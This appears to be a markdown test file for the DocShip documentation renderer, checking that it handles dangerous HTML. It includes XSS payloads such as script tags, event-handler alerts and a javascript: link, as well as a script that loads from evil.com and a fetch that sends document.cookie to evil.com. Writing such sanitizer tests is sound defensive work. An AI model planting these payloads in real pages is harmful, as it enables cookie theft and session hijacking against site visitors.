> ⚠️ **This is a test file for DocShip development. The content below is sample documentation.**

# Dangerous HTML Test

## Script Injection Attempts

<script>alert('XSS')</script>

<script type="text/javascript">
document.write('injected');
console.log('malicious code');
</script>

<script src="https://evil.com/malware.js"></script>

<script>
fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

## Style Injection

<style>
body { display: none !important; }
* { background: red; }
</style>

<style type="text/css">
.content { visibility: hidden; }
</style>

## Event Handlers

<div onclick="alert('click')">Click me</div>
<img src="x" onerror="alert('error')">
<body onload="alert('loaded')">
<a href="javascript:alert('js')">Link</a>
<iframe onload="alert('iframe')"></iframe>

## Unclosed Tags

<div>This div never closes

<span>Neither does this span

<p>Paragraph without end

<table>
<tr>
<td>Cell without closing tags

## Deeply Nested Unclosed

<div><div><div><div><div>
Five levels deep, none closed

## Invalid/Custom Tags

<custom-element>Custom element content</custom-element>
<my-component prop="value">Component</my-component>
<invalid-tag>Invalid</invalid-tag>
<x-data>X-Data</x-data>

## HTML Comments

<!-- Normal comment -->
<!-- 
Multi-line
comment
-->
<!--[if IE]>IE only<![endif]-->
<!--- Triple dash --->

## CDATA Sections

<![CDATA[
This is CDATA content
<not>parsed</not>
]]>

## Normal Content

This paragraph should render normally despite all the chaos above.
